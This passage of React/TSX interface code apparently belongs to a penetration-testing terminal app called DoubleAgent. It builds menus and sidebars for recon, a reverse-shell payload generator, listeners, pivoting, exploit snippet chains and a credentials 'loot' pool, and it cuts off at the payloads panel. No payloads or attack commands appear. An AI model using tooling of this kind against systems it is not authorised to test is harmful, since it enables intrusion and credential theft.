                {renderDropdownRow('cmd', 'Local Shell (Command Prompt)', undefined, () => void handleOpenLocalTerminal('cmd'))}
                {renderDropdownRow('wsl', 'Local Shell (WSL Linux)', undefined, () => void handleOpenLocalTerminal('wsl'))}
                {renderDropdownRow('dir-default', 'New in Default Directory', undefined, () => void handleOpenTerminalDirectory('default'))}
                {renderDropdownRow('dir-cwd', 'New in Current Directory (CWD)', undefined, () => void handleOpenTerminalDirectory('current'))}
                {renderDropdownRow('dir-root', 'New Root Shell in Current Directory', undefined, () => void handleOpenTerminalDirectory('root'))}

                <div className="nav-dropdown-divider" />
                <div className="tools-sub-header">Hardware &amp; Direct Links</div>
                {renderDropdownRow('serial', 'Hardware Bus & UART Logic', undefined, () => void handleOpenSerialModal())}
                {renderDropdownRow('raw-tcp', 'Raw TCP / Netcat', undefined, () => setShowRawTcpModal(true))}
                {renderDropdownRow('hex-runner', 'Binary / Hex Runner (No-PTY)', undefined, () => openHexRunnerTab())}
                {renderDropdownRow('remote-sockets', 'Remote Listening Sockets (-L)', undefined, () => setShowRemoteSocketsModal(true))}
                {renderDropdownRow('winrm-client', 'WinRM / PowerShell Remoting', undefined, () => openWinrmTab())}
              </div>
            )}
          </div>

          {/* 3b. Recon & Exploit Dropdown (Active Offensive Pentest Phases) */}
          <div
            className="nav-menu-container"
            onMouseEnter={() => handleMenuEnter('offense')}
            onMouseMove={handleMenuMove}
            onMouseLeave={handleMenuLeave}
          >
            <button
              type="button"
              className={`nav-menu-trigger ${activeDropdownMenu === 'offense' ? 'active' : ''}`}
              aria-haspopup="true"
              aria-expanded={activeDropdownMenu === 'offense'}
              onClick={() =>
                setActiveDropdownMenu((prev) => (prev === 'offense' ? null : 'offense'))
              }
            >
              <CyberIcon name="radar" size={11} />
              <span>Recon &amp; Exploit</span>
              <span style={{ fontSize: '0.65rem' }}><CyberIcon name="chevron-down" size={14} /></span>
            </button>
            {activeDropdownMenu === 'offense' && (
              <div
                className="nav-dropdown-menu"
                role="menu"
                aria-label="Recon and Exploit Menu"
                onMouseEnter={() => handleMenuEnter('offense')}
                onMouseMove={handleMenuMove}
              >
                <div className="tools-sub-header">Phase 1 // Recon &amp; Enumeration</div>
                {renderDropdownRow('nmap-import', 'Nmap XML Recon Ingest', undefined, () => setShowNmapImportModal(true), false, false, 'XML')}
                {renderDropdownRow('api-tester', 'API Tester & HTTP Repeater', undefined, () => openApiTesterTab())}
                {renderDropdownRow('hex-runner', 'Binary / Hex Runner (No-PTY)', undefined, () => openHexRunnerTab(), false, false, 'RAW')}
                {renderDropdownRow('remote-sockets', 'Remote Sockets & Quick -L Tunnel', undefined, () => setShowRemoteSocketsModal(true), false, false, 'SSH')}

                <div className="nav-dropdown-divider" />
                <div className="tools-sub-header">Phase 2 // Delivery &amp; Catchers</div>
                {renderDropdownRow('listener-manager', 'Listener Manager', undefined, () => setShowListenerManagerModal(true))}
                {renderDropdownRow('payload-generator', 'Payload Generator // Shells', undefined, () => setShowPayloadGeneratorModal(true), false, false, 'JSON')}
                {renderDropdownRow('file-transfer', 'File Transfer Helper // Staging', undefined, () => setShowFileTransferModal(true), false, false, 'DIR')}

                <div className="nav-dropdown-divider" />
                <div className="tools-sub-header">Phase 3 // Execution &amp; Post-Exploit</div>
                {renderDropdownRow('winrm-client', 'WinRM / PowerShell Remoting', undefined, () => openWinrmTab())}
                {renderDropdownRow('snippets', 'Command Snippets & Variables', undefined, () => setShowSnippetsModal(true), false, false, 'JSON')}
                {renderDropdownRow('snippet-chains', 'Snippet Chains & Exploits', undefined, () => {
                  setChainsHostFilter(activeTab?.hostId || null);
                  setShowChainsModal(true);
                }, false, false, 'JSON')}
              </div>
            )}
          </div>

          {/* 3c. Networking & Pivoting Dropdown */}
          <div
            className="nav-menu-container"
            onMouseEnter={() => handleMenuEnter('networking')}
            onMouseMove={handleMenuMove}
            onMouseLeave={handleMenuLeave}
          >
            <button
              type="button"
              className={`nav-menu-trigger ${activeDropdownMenu === 'networking' ? 'active' : ''}`}
              aria-haspopup="true"
              aria-expanded={activeDropdownMenu === 'networking'}
              onClick={() =>
                setActiveDropdownMenu((prev) => (prev === 'networking' ? null : 'networking'))
              }
            >
              <CyberIcon name="tunnel" size={11} />
              <span>Networking &amp; Pivoting</span>
              <span style={{ fontSize: '0.65rem' }}><CyberIcon name="chevron-down" size={14} /></span>
            </button>
            {activeDropdownMenu === 'networking' && (
              <div
                className="nav-dropdown-menu"
                role="menu"
                aria-label="Networking and Pivoting Menu"
                onMouseEnter={() => handleMenuEnter('networking')}
                onMouseMove={handleMenuMove}
              >
                <div className="tools-sub-header">Tunnels, Proxies &amp; Pivoting</div>
                {renderDropdownRow(
                  'tunnels',
                  'Port Forwarding',
                  activeTunnels.length > 0 ? `${activeTunnels.length} active` : undefined,
                  () => setShowPortForwardingModal(true),
                  false,
                  activeTunnels.length > 0
                )}
                {renderDropdownRow('proxy-profiles', 'Proxy Profiles', undefined, () => setShowProxyProfilesModal(true))}
                {renderDropdownRow('pivot-manager', 'Pivoting Engine', undefined, () => setShowPivotManagerModal(true))}
              </div>
            )}
          </div>

          {/* 3c. Intel & Keys Dropdown (Information, Logs, Documentation & Auth) */}
          <div
            className="nav-menu-container"
            onMouseEnter={() => handleMenuEnter('intel')}
            onMouseMove={handleMenuMove}
            onMouseLeave={handleMenuLeave}
          >
            <button
              type="button"
              className={`nav-menu-trigger ${activeDropdownMenu === 'intel' ? 'active' : ''}`}
              aria-haspopup="true"
              aria-expanded={activeDropdownMenu === 'intel'}
              onClick={() =>
                setActiveDropdownMenu((prev) => (prev === 'intel' ? null : 'intel'))
              }
            >
              <CyberIcon name="shield" size={11} />
              <span>Intel &amp; Keys</span>
              <span style={{ fontSize: '0.65rem' }}><CyberIcon name="chevron-down" size={14} /></span>
            </button>
            {activeDropdownMenu === 'intel' && (
              <div
                className="nav-dropdown-menu"
                role="menu"
                aria-label="Intel and Keys Menu"
                onMouseEnter={() => handleMenuEnter('intel')}
                onMouseMove={handleMenuMove}
              >
                <div className="tools-sub-header">Navigation &amp; Quick Search</div>
                {renderDropdownRow('palette', 'Command Palette', 'Ctrl+K', () => {
                  setPaletteQuery('');
                  setShowCommandPalette(true);
                })}

                <div className="nav-dropdown-divider" />
                <div className="tools-sub-header">Documentation &amp; Audit Transcripts</div>
                {renderDropdownRow('notes', 'Host Notes & Docs', undefined, () => {
                  setNotesModalHostId(activeTab?.hostId);
                  setNotesModalInitialNoteId(null);
                  setShowNotesModal(true);
                })}
                {renderDropdownRow('session-logs', 'Session Logs & Recordings', undefined, () => {
                  void refreshSessionLogs();
                  setShowSessionLogsModal(true);
                })}

                <div className="nav-dropdown-divider" />
                <div className="tools-sub-header">Authentication &amp; Cryptographic Keys</div>
                {renderDropdownRow('totp', 'TOTP Authenticator Generator', undefined, () => setShowTotpModal(true))}
                {renderDropdownRow('keychain', 'Keychain & SSH Keys', undefined, () => {
                  setModalError('');
                  setShowKeychainModal(true);
                })}
              </div>
            )}
          </div>

          {/* Sync Warning / Conflict Pill */}
          {syncInfo?.detectedConflict && (
            <button
              type="button"
              className="nav-menu-trigger nav-sync-conflict-btn"
              style={{
                color: '#ef4444',
                borderColor: 'rgba(239, 68, 68, 0.6)',
                background: 'rgba(239, 68, 68, 0.12)',
              }}
              onClick={() => {
                setSettingsActiveTab('sync');
                setShowGlobalSettingsModal(true);
              }}
              title="Cloud sync conflict detected! Click to review and resolve."
              aria-label="Cloud Sync Conflict"
            >
              <CyberIcon name="bolt" size={11} />
              <span>SYNC CONFLICT ({syncInfo.conflictCount})</span>
            </button>
          )}

          {/* Execution Context Switcher (Local vs Remote Companion Agent, F-46) */}
          <ExecContextControl
            context={remoteExecContext}
            sshSessions={tabs.flatMap((t): AttachableSshSession[] =>
              collectPanes(t.rootNode)
                .filter(
                  (p) =>
                    liveSessions.has(p.sessionId) &&
                    (!p.paneType || p.paneType === 'terminal') &&
                    !p.isRawTcp &&
                    !p.sessionId.startsWith('local-') &&
                    !p.sessionId.startsWith('rpty-') &&
                    !p.sessionId.startsWith('serial-') &&
                    !p.sessionId.startsWith('winrm-') &&
                    !p.sessionId.startsWith('rawtcp-')
                )
                .map((p) => ({ sessionId: p.sessionId, label: p.title }))
            )}
            busySessionId={attachingAgentSessionId}
            onAttachAgent={(sid, label) => void handleAttachRemoteAgent(sid, label)}
            onSelectContext={(sid) => void handleSelectExecContext(sid)}
            onDetachAgent={(sid) => void handleDetachRemoteAgent(sid)}
            onOpenRemoteShell={() => void handleOpenRemoteAgentShell('')}
            onBrowseRemoteDirs={() => setShowRemoteDirPicker(true)}
          />

          {/* Global Settings (floated to the far right) */}
          <button
            type="button"
            className="nav-menu-trigger nav-settings-right"
            style={{ marginLeft: '0.25rem' }}
            onClick={() => {
              setSettingsActiveTab('appearance');
              setShowGlobalSettingsModal(true);
            }}
            title="Global Settings (Ctrl+,)"
            aria-label="Settings"
          >
            <CyberIcon name="gear" size={12} />
            <span>Settings</span>
          </button>
        </nav>
      </header>

      <div className="workspace-body">
        {/* Left-most Cyberpunk Activity Bar (Action Bar) */}
        <div className="cyber-activity-bar" role="toolbar" aria-label="Activity Bar">
          <div className="activity-bar-items">
            <img
              src={appLogo}
              alt="DoubleAgent"
              className="activity-bar-logo"
              onClick={() => {
                setSidebarCollapsed(false);
                setActiveSidebarPanel('hosts');
              }}
              title="DoubleAgent HUD (Click to view Hosts)"
            />

            {/* SECTION 1: Global / Unspecific Actions (Hosts, Snippets, Chains, Active Listeners) */}
            <div className="activity-bar-section-label" title="Global & Unspecific Tools">
              OPS
            </div>

            {/* 1. Hosts & Targets */}
            <button
              type="button"
              className={`activity-bar-btn ${activeSidebarPanel === 'hosts' && !sidebarCollapsed ? 'active' : ''}`}
              onClick={() => {
                if (activeSidebarPanel === 'hosts' && !sidebarCollapsed) {
                  setSidebarCollapsed(true);
                } else {
                  setActiveSidebarPanel('hosts');
                  setSidebarCollapsed(false);
                }
              }}
              title="Hosts & Target Inventory (Ctrl+1)"
              aria-label="Hosts and Targets Panel"
            >
              <CyberIcon name="network" size={18} />
            </button>

            {/* 2. Quick Snippets */}
            <button
              type="button"
              className={`activity-bar-btn ${activeSidebarPanel === 'snippets' && !sidebarCollapsed ? 'active' : ''}`}
              onClick={() => {
                if (activeSidebarPanel === 'snippets' && !sidebarCollapsed) {
                  setSidebarCollapsed(true);
                } else {
                  setActiveSidebarPanel('snippets');
                  setSidebarCollapsed(false);
                }
              }}
              title="Quick Snippets & Commands (Ctrl+2)"
              aria-label="Quick Snippets Panel"
            >
              <CyberIcon name="bolt" size={18} />
            </button>

            {/* 3. Snippet Chains & Exploits (F-16) */}
            <button
              type="button"
              className={`activity-bar-btn ${activeSidebarPanel === 'chains' && !sidebarCollapsed ? 'active' : ''}`}
              onClick={() => {
                if (activeSidebarPanel === 'chains' && !sidebarCollapsed) {
                  setSidebarCollapsed(true);
                } else {
                  setActiveSidebarPanel('chains');
                  setSidebarCollapsed(false);
                }
              }}
              title="Snippet Chains & Exploits (Ctrl+3)"
              aria-label="Snippet Chains Panel"
            >
              <CyberIcon name="chain" size={18} />
            </button>

            {/* 3b. Payload Generator & Reverse/Bind Shells */}
            <button
              type="button"
              className={`activity-bar-btn ${activeSidebarPanel === 'payloads' && !sidebarCollapsed ? 'active' : ''}`}
              onClick={() => {
                if (activeSidebarPanel === 'payloads' && !sidebarCollapsed) {
                  setSidebarCollapsed(true);
                } else {
                  setActiveSidebarPanel('payloads');
                  setSidebarCollapsed(false);
                }
              }}
              title="Payload Generator & Shells"
              aria-label="Payload Generator Panel"
            >
              <CyberIcon name="target" size={18} />
            </button>

            {/* 4. Network Pivoting & Relay Launcher */}
            <button
              type="button"
              className={`activity-bar-btn ${activeSidebarPanel === 'pivot' && !sidebarCollapsed ? 'active' : ''}`}
              onClick={() => {
                if (activeSidebarPanel === 'pivot' && !sidebarCollapsed) {
                  setSidebarCollapsed(true);
                } else {
                  setActiveSidebarPanel('pivot');
                  setSidebarCollapsed(false);
                }
              }}
              title="Network Pivoting & Tunnel Launcher"
              aria-label="Network Pivoting Panel"
            >
              <CyberIcon name="pivot-hop" size={18} />
            </button>

            {/* 4b. Port Forwards Quick Start / Stop */}
            <button
              type="button"
              className={`activity-bar-btn ${activeSidebarPanel === 'forwards' && !sidebarCollapsed ? 'active' : ''}`}
              onClick={() => {
                if (activeSidebarPanel === 'forwards' && !sidebarCollapsed) {
                  setSidebarCollapsed(true);
                } else {
                  setActiveSidebarPanel('forwards');
                  setSidebarCollapsed(false);
                }
              }}
              title="Port Forwards & SSH Tunnels (-L / -R / -D)"
              aria-label="Port Forwards Panel"
            >
              <CyberIcon name="tunnel" size={18} />
            </button>

            {/* 5. File Transfer Helper & Staging */}
            <button
              type="button"
              className={`activity-bar-btn ${activeSidebarPanel === 'transfer' && !sidebarCollapsed ? 'active' : ''}`}
              onClick={() => {
                if (activeSidebarPanel === 'transfer' && !sidebarCollapsed) {
                  setSidebarCollapsed(true);
                } else {
                  setActiveSidebarPanel('transfer');
                  setSidebarCollapsed(false);
                }
              }}
              title="File Transfer Helper & Staging Servers"
              aria-label="File Transfer Helper Panel"
            >
              <CyberIcon name="upload" size={18} />
            </button>

            {/* 6. Active Listeners */}
            <button
              type="button"
              className={`activity-bar-btn ${activeSidebarPanel === 'listeners' && !sidebarCollapsed ? 'active' : ''}`}
              onClick={() => {
                if (activeSidebarPanel === 'listeners' && !sidebarCollapsed) {
                  setSidebarCollapsed(true);
                } else {
                  setActiveSidebarPanel('listeners');
                  setSidebarCollapsed(false);
                }
              }}
              title="Active Listeners & Catchers (Ctrl+4)"
              aria-label="Active Listeners Panel"
            >
              <CyberIcon name="radar" size={18} />
            </button>

            {/* Cyberpunk Section Divider between Global Ops and Host-Specific Context */}
            <div className="activity-bar-section-divider" role="separator" aria-label="Host Specific Actions">
              <span className="activity-bar-divider-line" />
              <span className="activity-bar-section-label">HOST</span>
            </div>

            {/* SECTION 2: Host & Engagement Specific Actions (Notes, 2FA, Credentials) */}
            {/* 5. Scratchpad & Host Notes (F-17) */}
            <button
              type="button"
              className={`activity-bar-btn ${activeSidebarPanel === 'notes' && !sidebarCollapsed ? 'active' : ''}`}
              onClick={() => {
                if (activeSidebarPanel === 'notes' && !sidebarCollapsed) {
                  setSidebarCollapsed(true);
                } else {
                  setActiveSidebarPanel('notes');
                  setSidebarCollapsed(false);
                }
              }}
              title="Host Notes & Scratchpad (Ctrl+5)"
              aria-label="Scratchpad and Notes Panel"
            >
              <CyberIcon name="note" size={18} />
            </button>

            {/* 6. 2FA / TOTP Authenticators (Active Host + Global) (F-20) */}
            <button
              type="button"
              className={`activity-bar-btn ${activeSidebarPanel === 'totp' && !sidebarCollapsed ? 'active' : ''}`}
              onClick={() => {
                if (activeSidebarPanel === 'totp' && !sidebarCollapsed) {
                  setSidebarCollapsed(true);
                } else {
                  setActiveSidebarPanel('totp');
                  setSidebarCollapsed(false);
                }
              }}
              title="2FA / TOTP Authenticators for Active Host & Global (Ctrl+6)"
              aria-label="2FA and TOTP Panel"
            >
              <CyberIcon name="totp" size={18} />
            </button>

            {/* 7. Credentials & Loot (Host & Engagement Bound) (F-36) */}
            <button
              type="button"
              className={`activity-bar-btn ${activeSidebarPanel === 'credentials' && !sidebarCollapsed ? 'active' : ''}`}
              onClick={() => {
                if (activeSidebarPanel === 'credentials' && !sidebarCollapsed) {
                  setSidebarCollapsed(true);
                } else {
                  setActiveSidebarPanel('credentials');
                  setSidebarCollapsed(false);
                }
              }}
              title="Host & Engagement Credentials Pool (Ctrl+7)"
              aria-label="Credentials Panel"
            >
              <CyberIcon name="key" size={18} />
            </button>
          </div>

          <div className="activity-bar-bottom">
            <button
              type="button"
              className="activity-bar-btn toggle-sidebar-btn"
              onClick={() => setSidebarCollapsed((prev) => !prev)}
              title={sidebarCollapsed ? 'Expand Sidebar (Ctrl+B)' : 'Collapse Sidebar (Ctrl+B)'}
              aria-label={sidebarCollapsed ? 'Expand Sidebar' : 'Toggle Sidebar (Ctrl+B)'}
            >
              <CyberIcon name={sidebarCollapsed ? 'chevron-right' : 'chevron-left'} size={16} />
            </button>
          </div>
        </div>

        <aside
          className={`hosts-sidebar ${sidebarCollapsed ? 'collapsed' : ''} ${sidebarWidth < 280 ? 'narrow' : ''
            } ${sidebarWidth < 220 ? 'compact' : ''}`}
          style={{
            width: sidebarCollapsed ? 0 : `${sidebarWidth}px`,
            display: sidebarCollapsed ? 'none' : 'flex',
          }}
          aria-label="Hosts and Groups Sidebar"
        >
          {sidebarCollapsed ? (
            <div className="sidebar-collapsed-content" style={{ display: 'none' }} />
          ) : (
            <>
              {activeSidebarPanel === 'hosts' && (
                <>
                  <div className="sidebar-header">
                    <h2>Hosts &amp; Labels</h2>
                    {!vaultLocked && (
                      <div className="sidebar-actions">
                        <button
                          type="button"
                          className="btn-primary btn-sm"
                          onClick={() => {
                            setEditingHostId(null);
                            setHostLabel('');
                            setHostAddr('');
                            setHostPort('22');
                            setHostGroupId('');
                            setHostUser('');
                            setHostPass('');
                            setHostTags('');
                            setHostColor('');
                            setHostInitialDir('');
                            setShowAddHostModal(true);
                          }}
                        >
                          + Host
                        </button>
                      </div>
                    )}
                  </div>

                  {vaultLocked ? (
                    <div className="sidebar-locked-notice">
                      <p>Vault is locked. Unlock to view encrypted hosts, labels, and credentials.</p>
                    </div>
                  ) : (
                    <>
                      <input
                        className="sidebar-search"
                        aria-label="Filter Hosts"
                        placeholder="Search hosts, IP, labels/tags..."
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                      />

                      {/* Engagement Scope Filter Toggle */}
                      {activeEngagement ? (
                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0.2rem 0.6rem 0.35rem 0.6rem', fontSize: '0.72rem' }}>
                          <span style={{ color: 'var(--accent-bright)', fontWeight: 700, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', maxWidth: '140px' }} title={activeEngagement.name}>
                            <CyberIcon name="target" size={14} /> {activeEngagement.name}
                          </span>
                          <button
                            type="button"
                            className="cyber-btn cyber-btn-secondary cyber-btn-sm"
                            style={{ fontSize: '0.66rem', padding: '1px 6px' }}
                            onClick={() => setFilterByEngagementScope((prev) => !prev)}
                            title={filterByEngagementScope ? 'Showing only in-scope hosts for this engagement' : 'Showing all hosts in vault'}
                          >
                            {filterByEngagementScope ? <><CyberIcon name="target" size={14} /> In-Scope Only</> : <><CyberIcon name="globe" size={14} /> All Vault Hosts</>}
                          </button>
                        </div>
                      ) : (
                        engagementsList.length > 0 && (
                          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0.2rem 0.6rem 0.35rem 0.6rem', fontSize: '0.72rem' }}>
                            <span style={{ color: '#94a3b8' }}><CyberIcon name="globe" size={14} /> Casual Mode (Global Hosts)</span>
                            <button
                              type="button"
                              className="cyber-btn cyber-btn-secondary cyber-btn-sm"
                              style={{ fontSize: '0.66rem', padding: '1px 6px' }}
                              onClick={() => setFilterByEngagementScope((prev) => !prev)}
                            >
                              {filterByEngagementScope ? 'Casual Only' : 'All Hosts'}
                            </button>
                          </div>
                        )
                      )}

                      {/* Multi-Label Filter Bar */}
                      {allHostTags.length > 0 && (
                        <div className="sidebar-tags-filter-bar" role="toolbar" aria-label="Filter Hosts by Label">
                          <button
                            type="button"
                            className={`sidebar-tag-pill ${selectedHostTag === 'all' ? 'active' : ''}`}
                            onClick={() => setSelectedHostTag('all')}
                          >
                            All ({vaultSummary.hosts.length})
                          </button>
                          {allHostTags.map((tag) => {
                            const count = vaultSummary.hosts.filter(
                              (h) => h.tags && h.tags.some((t) => t.toLowerCase() === tag.toLowerCase())
                            ).length;
                            return (
                              <button
                                key={tag}
                                type="button"
                                className={`sidebar-tag-pill ${selectedHostTag.toLowerCase() === tag.toLowerCase() ? 'active' : ''}`}
                                onClick={() => setSelectedHostTag((prev) => (prev.toLowerCase() === tag.toLowerCase() ? 'all' : tag))}
                                title={`Filter by label #${tag} (${count} hosts)`}
                              >
                                #{tag} ({count})
                              </button>
                            );
                          })}
                        </div>
                      )}

                      <div className="sidebar-list">
                        {filteredHosts.length === 0 ? (
                          <div style={{ padding: '1.5rem 1rem', textAlign: 'center', color: 'var(--text-muted)', fontSize: '0.78rem' }}>
                            {selectedHostTag !== 'all' ? (
                              <>
                                No hosts found with label <strong>#{selectedHostTag}</strong>.
                                <br />
                                <button
                                  type="button"
                                  className="btn-link"
                                  style={{ marginTop: '0.5rem', fontSize: '0.75rem', color: 'var(--accent-bright)', cursor: 'pointer', background: 'none', border: 'none' }}
                                  onClick={() => setSelectedHostTag('all')}
                                >
                                  Show all hosts
                                </button>
                              </>
                            ) : searchQuery.trim() ? (
                              `No hosts match "${searchQuery}".`
                            ) : (
                              'No saved hosts in Vault. Click + Host to create one.'
                            )}
                          </div>
                        ) : (
                          filteredHosts.map((h) => (
                            <div
                              key={h.id}
                              className="host-card rack-blade-card"
                              draggable
                              onDoubleClick={() => void handleConnectSavedHost(h)}
                              onDragStart={() =>
                                startWorkspaceDrag({
                                  type: 'host',
                                  hostId: h.id,
                                  label: h.label,
                                })
                              }
                              onDragEnd={() => startWorkspaceDrag(null)}
                              title={`Double-click to connect · Drag ${h.label} onto any terminal pane to split`}
                            >
                              <div className="host-info">
                                <div className="host-title-row">
                                  <span
                                    className="host-color-dot"
                                    style={{
                                      backgroundColor: getEffectiveHostColor(h.id, h.color, h.label),
                                    }}
                                    title={`Host Color: ${getEffectiveHostColor(h.id, h.color, h.label)}`}
                                  />
                                  <strong>{h.label}</strong>
                                  {h.engagementId && (
                                    <span
                                      style={{
                                        background: 'color-mix(in srgb, var(--accent-bright) 12%, transparent)',
                                        border: '1px solid color-mix(in srgb, var(--accent-bright) 35%, transparent)',
                                        color: 'var(--accent-bright)',
                                        fontSize: '0.62rem',
                                        fontWeight: 700,
                                        padding: '1px 5px',
                                        borderRadius: '2px',
                                        marginLeft: 'auto',
                                      }}
                                      title={`Bound to engagement: ${engagementsList.find((e) => e.id === h.engagementId)?.name || h.engagementId}`}
                                    >
                                      <CyberIcon name="target" size={14} /> {engagementsList.find((e) => e.id === h.engagementId)?.name || 'ENGAGED'}
                                    </span>
                                  )}
                                </div>
                                <span className="host-address-line">
                                  {h.effectiveUser}@{h.address}:{h.effectivePort}
                                </span>
                                {h.initialDir && (
                                  <span className="host-dir-line" title={`Default Directory: ${h.initialDir}`}>
                                    <CyberIcon name="folder" size={10} /> {h.initialDir}
                                  </span>
                                )}
                                {h.tags && h.tags.length > 0 && (
                                  <div className="host-tags-list">
                                    {h.tags.map((tag) => (
                                      <span
                                        key={tag}
                                        className="host-tag-badge"
                                        title={`Filter by label #${tag}`}
                                        onClick={(e) => {
                                          e.stopPropagation();
                                          setSelectedHostTag(tag);
                                        }}
                                      >
                                        {tag}
                                      </span>
                                    ))}
                                  </div>
                                )}
                              </div>
                              <div className="host-card-actions rack-blade-actions">
                                <button
                                  type="button"
                                  className="rack-action-btn rack-connect-btn"
                                  title={`Connect to ${h.label}`}
                                  onClick={() => void handleConnectSavedHost(h)}
                                >
                                  <CyberIcon name="play" size={10} />
                                  <span className="rack-connect-label">Connect</span>
                                </button>
                                <button
                                  type="button"
                                  className="rack-action-btn"
                                  title={`Open ${h.label} side-by-side in current workspace view`}
                                  aria-label={`Split Connect ${h.label}`}
                                  onClick={() => void handleConnectHostIntoSplit(h, 'right')}
                                >
                                  <CyberIcon name="split-h" size={12} />
                                </button>
                                <button
                                  type="button"
                                  className="rack-action-btn"
                                  title={`Open SFTP file browser for ${h.label}`}
                                  aria-label={`SFTP for ${h.label}`}
                                  onClick={() => void handleOpenHostSftp(h)}
                                >
                                  <CyberIcon name="folder" size={12} />
                                  <span className="sr-only">SFTP</span>
                                </button>
                                <button
                                  type="button"
                                  className="rack-action-btn"
                                  title={`Open Notes & Docs for ${h.label}`}
                                  aria-label={`Notes for ${h.label}`}
                                  onClick={() => openNotesTab(h.id)}
                                >
                                  <CyberIcon name="note" size={12} />
                                </button>
                                <button
                                  type="button"
                                  className="rack-action-btn"
                                  title={`Edit ${h.label} configuration & labels`}
                                  aria-label={`Edit ${h.label}`}
                                  onClick={() => handleOpenEditHost(h)}
                                >
                                  <CyberIcon name="edit" size={12} />
                                </button>
                                <button
                                  type="button"
                                  className="rack-action-btn rack-delete-btn"
                                  onClick={() => void handleDeleteHost(h.id)}
                                  aria-label={`Delete ${h.label}`}
                                  title={`Delete ${h.label}`}
                                >
                                  ×
                                </button>
                              </div>
                            </div>
                          ))
                        )}
                      </div>
                    </>
                  )}
                </>
              )}

              {activeSidebarPanel === 'snippets' && (
                <div className="drawer-panel drawer-snippets-panel">
                  <div className="sidebar-header">
                    <h2>Quick Snippets</h2>
                    <div className="sidebar-actions">
                      <button
                        type="button"
                        className="btn-primary btn-sm"
                        onClick={() => setShowSnippetsModal(true)}
                        title="Open Snippets Manager"
                      >
                        + Manage
                      </button>
                    </div>
                  </div>
                  <input
                    className="sidebar-search"
                    aria-label="Filter Snippets"
                    placeholder="Search snippets & commands..."
                    value={snippetDrawerQuery}
                    onChange={(e) => setSnippetDrawerQuery(e.target.value)}
                  />
                  <div className="drawer-filter-bar">
                    <button
                      type="button"
                      className={`drawer-filter-btn ${snippetDrawerOs === 'all' ? 'active' : ''}`}
                      onClick={() => setSnippetDrawerOs('all')}
                    >
                      ALL
                    </button>
                    <button
                      type="button"
                      className={`drawer-filter-btn ${snippetDrawerOs === 'linux' ? 'active' : ''}`}
                      onClick={() => setSnippetDrawerOs('linux')}
                    >
                      LINUX
                    </button>
                    <button
                      type="button"
                      className={`drawer-filter-btn ${snippetDrawerOs === 'windows' ? 'active' : ''}`}
                      onClick={() => setSnippetDrawerOs('windows')}
                    >
                      WINDOWS
                    </button>
                  </div>
                  {renderSidebarTagBar(snippetDrawerTags, snippetDrawerTag, setSnippetDrawerTag, 'Filter Snippets by Tag')}
                  <div className="drawer-items-list">
                    {filteredDrawerSnippets.length === 0 ? (
                      <div className="drawer-empty-state">
                        <span>No matching snippets found.</span>
                        <button
                          type="button"
                          className="cyber-hud-btn btn-primary btn-sm"
                          style={{ marginTop: '0.5rem', display: 'inline-flex', alignItems: 'center', gap: '0.35rem' }}
                          onClick={() => setShowSnippetsModal(true)}
                        >
                          <CyberIcon name="plus" size={12} />
                          <span>Create Snippet</span>
                        </button>
                      </div>
                    ) : (
                      filteredDrawerSnippets.map((snip) => (
                        <div key={snip.id} className="drawer-card">
                          <div className="drawer-card-header">
                            <span className="drawer-card-title">{snip.name}</span>
                            <span className="drawer-badge">
                              {snip.tags && snip.tags.length > 0 ? snip.tags[0].toUpperCase() : 'SNIP'}
                            </span>
                          </div>
                          {snip.description && <div className="drawer-card-desc">{snip.description}</div>}
                          {renderSidebarCardTags(snip.tags, snippetDrawerTag, setSnippetDrawerTag, 'snippets')}
                          <div className="drawer-card-code">
                            <code>{snip.body}</code>
                          </div>
                          <div className="drawer-card-actions">
                            <button
                              type="button"
                              className="drawer-action-btn"
                              onClick={() => void handleTriggerSnippet(snip, sessionId || undefined, 'insert')}
                              title="Resolve variables and insert snippet command into active terminal"
                            >
                              <CyberIcon name="copy" size={12} />
                              <span>Insert</span>
                            </button>
                            <button
                              type="button"
                              className="drawer-action-btn run-btn"
                              onClick={() => void handleTriggerSnippet(snip, sessionId || undefined, 'run')}
                              title="Resolve variables and execute snippet in active terminal"
                            >
                              <CyberIcon name="play" size={12} />
                              <span>Run</span>
                            </button>
                          </div>
                        </div>
                      ))
                    )}
                  </div>
                </div>
              )}

              {activeSidebarPanel === 'chains' && (
                <div className="drawer-panel drawer-chains-panel">
                  <div className="sidebar-header">
                    <h2>Chains &amp; Exploits</h2>
                    <div className="sidebar-actions">
                      <button
                        type="button"
                        className="btn-primary btn-sm"
                        onClick={() => {
                          setChainsHostFilter(null);
                          setShowChainsModal(true);
                        }}
                        title="Open Chains Manager"
                      >
                        + Chains
                      </button>
                    </div>
                  </div>
                  <input
                    className="sidebar-search"
                    aria-label="Filter Chains"
                    placeholder="Search chains, tags & steps..."
                    value={chainDrawerQuery}
                    onChange={(e) => setChainDrawerQuery(e.target.value)}
                  />
                  {renderSidebarTagBar(chainDrawerTags, chainDrawerTag, setChainDrawerTag, 'Filter Chains by Tag')}
                  <div className="drawer-items-list">
                    {filteredDrawerChains.length === 0 ? (
                      <div className="drawer-empty-state">
                        <span>No snippet chains found.</span>
                        <button
                          type="button"
                          className="cyber-hud-btn btn-primary btn-sm"
                          style={{ marginTop: '0.5rem', display: 'inline-flex', alignItems: 'center', gap: '0.35rem' }}
                          onClick={() => setShowChainsModal(true)}
                        >
                          <CyberIcon name="plus" size={12} />
                          <span>Create Chain</span>
                        </button>
                      </div>
                    ) : (
                      filteredDrawerChains.map((c) => (
                        <div key={c.id} className="drawer-card">
                          <div className="drawer-card-header">
                            <span className="drawer-card-title">{c.name}</span>
                            <span className="drawer-badge">{c.steps?.length || 0} STEPS</span>
                          </div>
                          {c.description && <div className="drawer-card-desc">{c.description}</div>}
                          {renderSidebarCardTags(c.tags, chainDrawerTag, setChainDrawerTag, 'chains')}
                          <div className="drawer-card-meta">
                            <span>OS: {c.targetOs?.toUpperCase() || 'ANY'}</span>
                            <span>MODE: {c.autoRunWithoutPrompt ? 'AUTO' : 'CONFIRM'}</span>
                          </div>
                          <div className="drawer-card-actions">
                            <button
                              type="button"
                              className="drawer-action-btn run-btn"
                              onClick={() => void handleTriggerChain(c)}
                              title="Launch chain runner on active session"
                            >
                              <CyberIcon name="play" size={12} />
                              <span>Run Chain</span>
                            </button>
                          </div>
                        </div>
                      ))
                    )}
                  </div>
                </div>
              )}

              {activeSidebarPanel === 'payloads' && (
